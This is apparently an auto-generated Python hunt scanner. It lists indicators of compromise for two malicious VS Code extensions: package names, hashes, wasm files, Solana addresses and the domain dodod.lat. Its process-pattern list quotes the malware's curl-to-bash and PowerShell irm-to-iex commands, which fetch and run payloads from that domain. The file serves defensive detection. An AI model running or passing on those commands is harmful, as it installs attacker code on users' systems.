#!/usr/bin/env python3
"""Generated offline hunt scanner; regenerate with generate_scanners.py."""
import importlib.util
import os
from pathlib import Path
import sys

PACKAGES = [
    "exargd/vsblack",
    "noellee-doc/flint-debug"
]
PACKAGE_VERSIONS = [
    "exargd/vsblack@0.0.1",
    "noellee-doc/flint-debug@0.1.1"
]
FILES = [
    "orybbbdsuqmaapel.wasm",
    "snqpkebiwrxmoivl.wasm",
    "noellee-doc.flint-debug-0.1.1.vsix",
    "exargd.vsblack-0.0.1.vsix"
]
HASHES = [
    "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f",
    "8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4",
    "4e143876eeaf5e767a9971f603b0f13c",
    "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58",
    "c0ed7d575fe8085e942898c9a26f15992c895ba9",
    "b262b8d2ac2f0ab3c78251db44ecf3ac",
    "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25",
    "824e601b599b9ad97ee12f0b3a72efd20ba59d47",
    "f595fb7867beb76b4deab53fa328e0a2"
]
DOMAINS = [
    "api.mainnet.solana.com",
    "dodod.lat"
]
PROCESS_PATTERNS = [
    "getSignaturesForAddress",
    "getTransaction",
    "jsonParsed",
    "require('child_process')",
    "execSync",
    "windowsHide",
    "curl -fsSL https://dodod.lat/darwin/i/_ | bash",
    "curl -fsSL https://dodod.lat/linux/i/_ | bash",
    "powershell -Command \"irm https://dodod.lat/win32/i/_ | iex\""
]
NETWORK_PATTERNS = [
    "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr",
    "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM",
    "6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz",
    "[9] dodod.lat",
    "zaitoona43",
    "291961103"
]
PROFILE = {
    'packages': PACKAGES,
    'package_versions': PACKAGE_VERSIONS,
    'files': FILES,
    'hashes': HASHES,
    'domains': DOMAINS,
    'process_patterns': PROCESS_PATTERNS,
    'network_patterns': NETWORK_PATTERNS
}

def main() -> int:
    try:
        runtime_path = Path(__file__).resolve().parents[2] / "scanner_runtime.py"
        spec = importlib.util.spec_from_file_location("hp_scanner_runtime", runtime_path)
        if spec is None or spec.loader is None:
            print(f"scanner runtime not found: {runtime_path}", file=sys.stderr)
            return 2
        runtime = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(runtime)
        args = list(sys.argv[1:])
        if os.environ.get("LOG_ROOT") and "--log-root" not in args:
            args.extend(["--log-root", os.environ["LOG_ROOT"]])
        if os.environ.get("OUT") and "--out" not in args:
            args.extend(["--out", os.environ["OUT"]])
        return runtime.main(args, PROFILE) if args else 2
    except Exception as exc:
        print(f"scanner execution error: {exc}", file=sys.stderr)
        return 2

if __name__ == "__main__":
    raise SystemExit(main())
